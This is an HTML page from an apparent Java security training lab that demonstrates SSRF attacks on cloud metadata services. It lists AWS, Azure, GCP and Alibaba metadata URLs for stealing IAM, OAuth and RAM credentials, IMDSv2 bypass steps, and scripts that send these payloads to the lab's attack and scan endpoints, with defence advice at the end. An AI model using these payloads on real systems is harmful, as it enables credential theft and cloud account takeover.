<!DOCTYPE html>
<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>云服务攻击SSRF演示 - Java Security Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css" rel="stylesheet">
    <style>
        .vulnerability-demo { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .safe-demo { background-color: #d1ecf1; border: 1px solid #bee5eb; }
        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
        .result-box { min-height: 150px; border: 1px solid #dee2e6; padding: 10px; background-color: #f8f9fa; font-family: monospace; white-space: pre-wrap; }
        .attack-input { font-family: monospace; }
        .cloud-card { border-left: 4px solid #17a2b8; }
        .aws-card { border-left-color: #ff9900; }
        .azure-card { border-left-color: #0078d4; }
        .gcp-card { border-left-color: #4285f4; }
        .alibaba-card { border-left-color: #ff6a00; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">Java Security Lab</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/ssrf">SSRF主页</a>
                <a class="nav-link" href="/">返回首页</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <h1 class="mb-4">云服务攻击SSRF演示</h1>
                
                <!-- 说明部分 -->
                <div class="alert alert-danger">
                    <h5><i class="fas fa-cloud"></i> 云服务SSRF攻击</h5>
                    <p>云环境中的SSRF攻击可以获取实例元数据、访问令牌、配置信息等敏感数据，是云安全的重要威胁。</p>
                    <p><strong>攻击目标：</strong> 云实例元数据、IAM凭证、配置信息、内网服务</p>
                    <p><strong>危害等级：</strong> 极高 - 可能导致云账户完全沦陷</p>
                </div>

                <!-- 云服务攻击演示 -->
                <div class="card vulnerability-demo mb-4">
                    <div class="card-header bg-warning">
                        <h5 class="mb-0"><i class="fas fa-bomb"></i> 云服务元数据攻击</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="cloudUrl" class="form-label">云服务URL：</label>
                                    <input type="text" class="form-control attack-input" id="cloudUrl" 
                                           placeholder="http://169.254.169.254/latest/meta-data/" 
                                           value="http://169.254.169.254/latest/meta-data/">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="cloudProvider" class="form-label">云服务提供商：</label>
                                    <select class="form-select" id="cloudProvider">
                                        <option value="aws">Amazon AWS</option>
                                        <option value="azure">Microsoft Azure</option>
                                        <option value="gcp">Google Cloud Platform</option>
                                        <option value="alibaba">阿里云</option>
                                        <option value="tencent">腾讯云</option>
                                        <option value="huawei">华为云</option>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="metadataType" class="form-label">元数据类型：</label>
                                    <select class="form-select" id="metadataType">
                                        <option value="instance">实例信息</option>
                                        <option value="credentials">访问凭证</option>
                                        <option value="security">安全组</option>
                                        <option value="network">网络配置</option>
                                        <option value="user-data">用户数据</option>
                                        <option value="iam">IAM角色</option>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <button type="button" class="btn btn-danger" onclick="attackCloudMetadata()">
                                        <i class="fas fa-bomb"></i> 攻击云元数据
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearCloudResult()">
                                        清除结果
                                    </button>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <h6>攻击结果：</h6>
                                <div id="cloudResult" class="result-box">
                                    选择云服务和元数据类型，点击"攻击云元数据"查看结果...
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 云服务提供商攻击载荷 -->
                <div class="row mb-4">
                    <div class="col-md-6">
                        <div class="card cloud-card aws-card mb-3">
                            <div class="card-header">
                                <h6><i class="fab fa-aws"></i> Amazon AWS 攻击载荷</h6>
                            </div>
                            <div class="card-body">
                                <h6>元数据服务 (IMDSv1/v2)：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/latest/meta-data/</code>
                                    <small class="text-muted d-block">基础元数据</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
                                    <small class="text-muted d-block">IAM角色列表</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/latest/user-data/</code>
                                    <small class="text-muted d-block">用户数据</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/latest/dynamic/instance-identity/document</code>
                                    <small class="text-muted d-block">实例身份文档</small>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-warning btn-sm" onclick="setCloudUrl('aws', 'credentials')">
                                        获取IAM凭证
                                    </button>
                                    <button class="btn btn-outline-warning btn-sm" onclick="setCloudUrl('aws', 'user-data')">
                                        获取用户数据
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="card cloud-card azure-card mb-3">
                            <div class="card-header">
                                <h6><i class="fab fa-microsoft"></i> Microsoft Azure 攻击载荷</h6>
                            </div>
                            <div class="card-body">
                                <h6>实例元数据服务 (IMDS)：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code>
                                    <small class="text-muted d-block">实例信息</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/</code>
                                    <small class="text-muted d-block">访问令牌</small>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-primary btn-sm" onclick="setCloudUrl('azure', 'instance')">
                                        获取实例信息
                                    </button>
                                    <button class="btn btn-outline-primary btn-sm" onclick="setCloudUrl('azure', 'credentials')">
                                        获取访问令牌
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card cloud-card gcp-card mb-3">
                            <div class="card-header">
                                <h6><i class="fab fa-google"></i> Google Cloud Platform 攻击载荷</h6>
                            </div>
                            <div class="card-body">
                                <h6>元数据服务器：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://metadata.google.internal/computeMetadata/v1/</code>
                                    <small class="text-muted d-block">基础元数据</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code>
                                    <small class="text-muted d-block">访问令牌</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://metadata.google.internal/computeMetadata/v1/project/project-id</code>
                                    <small class="text-muted d-block">项目ID</small>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-info btn-sm" onclick="setCloudUrl('gcp', 'credentials')">
                                        获取访问令牌
                                    </button>
                                    <button class="btn btn-outline-info btn-sm" onclick="setCloudUrl('gcp', 'instance')">
                                        获取实例信息
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="card cloud-card alibaba-card mb-3">
                            <div class="card-header">
                                <h6><i class="fas fa-cloud"></i> 阿里云 攻击载荷</h6>
                            </div>
                            <div class="card-body">
                                <h6>实例元数据：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://100.100.100.200/latest/meta-data/</code>
                                    <small class="text-muted d-block">基础元数据</small>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://100.100.100.200/latest/meta-data/ram/security-credentials/</code>
                                    <small class="text-muted d-block">RAM角色凭证</small>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-danger btn-sm" onclick="setCloudUrl('alibaba', 'credentials')">
                                        获取RAM凭证
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 云服务扫描工具 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>云服务自动扫描工具</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label class="form-label">扫描目标：</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="scanAws" checked>
                                        <label class="form-check-label" for="scanAws">Amazon AWS</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="scanAzure" checked>
                                        <label class="form-check-label" for="scanAzure">Microsoft Azure</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="scanGcp" checked>
                                        <label class="form-check-label" for="scanGcp">Google Cloud Platform</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="scanAlibaba">
                                        <label class="form-check-label" for="scanAlibaba">阿里云</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="scanTencent">
                                        <label class="form-check-label" for="scanTencent">腾讯云</label>
                                    </div>
                                </div>
                                
                                <div class="mb-3">
                                    <label class="form-label">扫描深度：</label>
                                    <select class="form-select" id="scanDepth">
                                        <option value="basic">基础扫描</option>
                                        <option value="detailed">详细扫描</option>
                                        <option value="comprehensive">全面扫描</option>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <button type="button" class="btn btn-primary" onclick="startCloudScan()">
                                        <i class="fas fa-search"></i> 开始扫描
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="stopCloudScan()">
                                        停止扫描
                                    </button>
                                </div>
                                
                                <div class="progress mb-3" style="display: none;" id="scanProgress">
                                    <div class="progress-bar" role="progressbar" style="width: 0%"></div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <h6>扫描结果：</h6>
                                <div id="scanResult" class="result-box">
                                    配置扫描参数并点击"开始扫描"...
                                </div>
                                
                                <div class="mt-3">
                                    <button type="button" class="btn btn-success btn-sm" onclick="exportScanResult()">
                                        <i class="fas fa-download"></i> 导出结果
                                    </button>
                                    <button type="button" class="btn btn-outline-info btn-sm ms-2" onclick="generateReport()">
                                        <i class="fas fa-file-alt"></i> 生成报告
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- IMDSv2 绕过技术 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>IMDSv2 绕过技术</h5>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-info">
                            <h6><i class="fas fa-info-circle"></i> IMDSv2 防护机制</h6>
                            <p>AWS IMDSv2 要求使用PUT请求获取令牌，然后在后续请求中使用该令牌。这增加了SSRF攻击的难度。</p>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-6">
                                <h6>IMDSv2 绕过载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <strong>步骤1：获取令牌</strong><br>
                                    <code>PUT /latest/api/token HTTP/1.1<br>
                                    Host: 169.254.169.254<br>
                                    X-aws-ec2-metadata-token-ttl-seconds: 21600</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <strong>步骤2：使用令牌访问元数据</strong><br>
                                    <code>GET /latest/meta-data/ HTTP/1.1<br>
                                    Host: 169.254.169.254<br>
                                    X-aws-ec2-metadata-token: [TOKEN]</code>
                                </div>
                                
                                <h6>绕过技术：</h6>
                                <ul class="small">
                                    <li>HTTP请求走私</li>
                                    <li>CRLF注入</li>
                                    <li>HTTP/2降级攻击</li>
                                    <li>代理服务器绕过</li>
                                </ul>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="imdsv2Payload" class="form-label">IMDSv2 绕过载荷：</label>
                                    <textarea class="form-control attack-input" id="imdsv2Payload" rows="6" 
                                              placeholder="输入HTTP请求载荷..."></textarea>
                                </div>
                                
                                <button type="button" class="btn btn-warning" onclick="testImdsv2Bypass()">
                                    <i class="fas fa-bomb"></i> 测试IMDSv2绕过
                                </button>
                                
                                <div class="mt-3">
                                    <h6>测试结果：</h6>
                                    <div id="imdsv2Result" class="result-box" style="min-height: 100px;">
                                        输入载荷并点击"测试IMDSv2绕过"...
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 防护建议 -->
                <div class="alert alert-success">
                    <h5><i class="fas fa-shield-alt"></i> 云服务SSRF防护建议</h5>
                    <div class="row">
                        <div class="col-md-6">
                            <h6>云平台配置：</h6>
                            <ul>
                                <li>启用IMDSv2（AWS）</li>
                                <li>禁用不必要的元数据服务</li>
                                <li>配置IAM角色最小权限</li>
                                <li>使用实例配置文件</li>
                                <li>启用CloudTrail日志</li>
                            </ul>
                            
                            <h6>网络层防护：</h6>
                            <ul>
                                <li>VPC网络隔离</li>
                                <li>安全组规则限制</li>
                                <li>NAT网关配置</li>
                                <li>私有子网部署</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6>应用层防护：</h6>
                            <ul>
                                <li>严格的URL白名单</li>
                                <li>元数据IP地址黑名单</li>
                                <li>请求头验证</li>
                                <li>响应内容过滤</li>
                                <li>超时和重试限制</li>
                            </ul>
                            
                            <h6>监控告警：</h6>
                            <ul>
                                <li>元数据访问监控</li>
                                <li>异常API调用告警</li>
                                <li>权限提升检测</li>
                                <li>网络流量分析</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        let scanInProgress = false;
        let scanInterval;
        
        // 设置云服务URL
        function setCloudUrl(provider, type) {
            const urls = {
                aws: {
                    credentials: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    'user-data': 'http://169.254.169.254/latest/user-data/',
                    instance: 'http://169.254.169.254/latest/meta-data/instance-id'
                },
                azure: {
                    instance: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                    credentials: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
                },
                gcp: {
                    credentials: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                    instance: 'http://metadata.google.internal/computeMetadata/v1/instance/'
                },
                alibaba: {
                    credentials: 'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
                    instance: 'http://100.100.100.200/latest/meta-data/instance-id'
                }
            };
            
            if (urls[provider] && urls[provider][type]) {
                document.getElementById('cloudUrl').value = urls[provider][type];
                document.getElementById('cloudProvider').value = provider;
                document.getElementById('metadataType').value = type;
            }
        }
        
        // 攻击云元数据
        function attackCloudMetadata() {
            const url = document.getElementById('cloudUrl').value;
            const provider = document.getElementById('cloudProvider').value;
            const metadataType = document.getElementById('metadataType').value;
            
            if (!url.trim()) {
                alert('请输入云服务URL');
                return;
            }
            
            const resultDiv = document.getElementById('cloudResult');
            resultDiv.textContent = '攻击云元数据中...';
            
            fetch('/ssrf/cloud/attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `url=${encodeURIComponent(url)}&provider=${provider}&metadataType=${metadataType}`
            })
            .then(response => response.json())
            .then(data => {
                let result = `攻击URL: ${data.url}\n`;
                result += `云服务商: ${data.provider}\n`;
                result += `元数据类型: ${data.metadataType}\n`;
                result += `执行时间: ${data.executionTime}ms\n`;
                result += `攻击状态: ${data.success ? '成功' : '失败'}\n\n`;
                
                if (data.cloudInfo) {
                    const info = data.cloudInfo;
                    result += `云服务信息:\n`;
                    result += `  服务类型: ${info.serviceType}\n`;
                    result += `  元数据版本: ${info.metadataVersion}\n`;
                    result += `  安全等级: ${info.securityLevel}\n`;
                    result += `  风险描述: ${info.riskDescription}\n\n`;
                }
                
                if (data.metadata) {
                    result += `获取的元数据:\n`;
                    if (typeof data.metadata === 'object') {
                        result += JSON.stringify(data.metadata, null, 2);
                    } else {
                        result += data.metadata;
                    }
                }
                
                if (data.credentials) {
                    result += `\n获取的凭证信息:\n`;
                    result += `  访问密钥: ${data.credentials.accessKey || 'N/A'}\n`;
                    result += `  秘密密钥: ${data.credentials.secretKey || 'N/A'}\n`;
                    result += `  会话令牌: ${data.credentials.sessionToken || 'N/A'}\n`;
                    result += `  过期时间: ${data.credentials.expiration || 'N/A'}\n`;
                }
                
                if (data.error) {
                    result += `错误信息: ${data.error}`;
                }
                
                if (data.warning) {
                    result += `\n警告: ${data.warning}`;
                }
                
                resultDiv.textContent = result;
            })
            .catch(error => {
                resultDiv.textContent = '攻击失败: ' + error;
            });
        }
        
        // 开始云服务扫描
        function startCloudScan() {
            if (scanInProgress) {
                alert('扫描正在进行中...');
                return;
            }
            
            const scanAws = document.getElementById('scanAws').checked;
            const scanAzure = document.getElementById('scanAzure').checked;
            const scanGcp = document.getElementById('scanGcp').checked;
            const scanAlibaba = document.getElementById('scanAlibaba').checked;
            const scanTencent = document.getElementById('scanTencent').checked;
            const depth = document.getElementById('scanDepth').value;
            
            if (!scanAws && !scanAzure && !scanGcp && !scanAlibaba && !scanTencent) {
                alert('请至少选择一个云服务提供商');
                return;
            }
            
            scanInProgress = true;
            const resultDiv = document.getElementById('scanResult');
            const progressDiv = document.getElementById('scanProgress');
            const progressBar = progressDiv.querySelector('.progress-bar');
            
            resultDiv.textContent = '开始云服务扫描...\n';
            progressDiv.style.display = 'block';
            progressBar.style.width = '0%';
            
            fetch('/ssrf/cloud/scan', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `aws=${scanAws}&azure=${scanAzure}&gcp=${scanGcp}&alibaba=${scanAlibaba}&tencent=${scanTencent}&depth=${depth}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const scanId = data.scanId;
                    // 开始轮询扫描状态
                    scanInterval = setInterval(() => {
                        checkScanStatus(scanId);
                    }, 2000);
                } else {
                    scanInProgress = false;
                    progressDiv.style.display = 'none';
                    resultDiv.textContent = '扫描启动失败: ' + data.error;
                }
            })
            .catch(error => {
                scanInProgress = false;
                progressDiv.style.display = 'none';
                resultDiv.textContent = '扫描启动失败: ' + error;
            });
        }
        
        // 检查扫描状态
        function checkScanStatus(scanId) {
            fetch(`/ssrf/cloud/scan/status?scanId=${scanId}`)
            .then(response => response.json())
            .then(data => {
                const resultDiv = document.getElementById('scanResult');
                const progressBar = document.querySelector('.progress-bar');
                
                progressBar.style.width = data.progress + '%';
                
                let result = `扫描进度: ${data.progress}%\n`;
                result += `当前状态: ${data.status}\n`;
                result += `已扫描: ${data.scannedCount}/${data.totalCount}\n\n`;
                
                if (data.results && data.results.length > 0) {
                    result += '扫描结果:\n';
                    data.results.forEach((item, index) => {
                        result += `${index + 1}. [${item.provider}] ${item.endpoint}\n`;
                        result += `   状态: ${item.accessible ? '可访问' : '不可访问'}\n`;
                        if (item.data) {
                            result += `   数据: ${item.data.substring(0, 100)}...\n`;
                        }
                        result += '\n';
                    });
                }
                
                resultDiv.textContent = result;
                
                if (data.completed) {
                    scanInProgress = false;
                    clearInterval(scanInterval);
                    document.getElementById('scanProgress').style.display = 'none';
                    
                    result += '\n扫描完成！';
                    if (data.summary) {
                        result += `\n总结: 发现 ${data.summary.vulnerableEndpoints} 个可访问的元数据端点`;
                    }
                    resultDiv.textContent = result;
                }
            })
            .catch(error => {
                console.error('检查扫描状态失败:', error);
            });
        }
        
        // 停止云服务扫描
        function stopCloudScan() {
            if (!scanInProgress) {
                alert('没有正在进行的扫描');
                return;
            }
            
            scanInProgress = false;
            if (scanInterval) {
                clearInterval(scanInterval);
            }
            document.getElementById('scanProgress').style.display = 'none';
            
            const resultDiv = document.getElementById('scanResult');
            resultDiv.textContent += '\n扫描已停止。';
        }
        
        // 测试IMDSv2绕过
        function testImdsv2Bypass() {
            const payload = document.getElementById('imdsv2Payload').value;
            
            if (!payload.trim()) {
                alert('请输入IMDSv2绕过载荷');
                return;
            }
            
            const resultDiv = document.getElementById('imdsv2Result');
            resultDiv.textContent = '测试IMDSv2绕过中...';
            
            fetch('/ssrf/cloud/imdsv2/bypass', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `payload=${encodeURIComponent(payload)}`
            })
            .then(response => response.json())
            .then(data => {
                let result = `绕过载荷长度: ${data.payloadLength} 字符\n`;
                result += `执行时间: ${data.executionTime}ms\n`;
                result += `绕过状态: ${data.bypassSuccess ? '成功' : '失败'}\n\n`;
                
                if (data.bypassAnalysis) {
                    const analysis = data.bypassAnalysis;
                    result += `绕过分析:\n`;
                    result += `  检测技术: ${analysis.detectionTechnique}\n`;
                    result += `  绕过方法: ${analysis.bypassMethod}\n`;
                    result += `  成功原因: ${analysis.successReason}\n\n`;
                }
                
                if (data.responseData) {
                    result += `响应数据:\n${data.responseData}`;
                }
                
                if (data.error) {
                    result += `错误信息: ${data.error}`;
                }
                
                resultDiv.textContent = result;
            })
            .catch(error => {
                resultDiv.textContent = '测试失败: ' + error;
            });
        }
        
        // 导出扫描结果
        function exportScanResult() {
            const result = document.getElementById('scanResult').textContent;
            if (!result || result.includes('配置扫描参数')) {
                alert('没有可导出的扫描结果');
                return;
            }
            
            const blob = new Blob([result], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cloud_ssrf_scan_${new Date().getTime()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        // 生成报告
        function generateReport() {
            fetch('/ssrf/cloud/report', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const reportWindow = window.open('', '_blank');
                    reportWindow.document.write(`
                        <html>
                        <head><title>云服务SSRF攻击报告</title></head>
                        <body>
                        <h1>云服务SSRF攻击报告</h1>
                        <pre>${data.report}</pre>
                        </body>
                        </html>
                    `);
                } else {
                    alert('生成报告失败: ' + data.error);
                }
            })
            .catch(error => {
                alert('生成报告失败: ' + error);
            });
        }
        
        // 清除结果
        function clearCloudResult() {
            document.getElementById('cloudResult').textContent = '选择云服务和元数据类型，点击"攻击云元数据"查看结果...';
        }
    </script>
</body>
</html>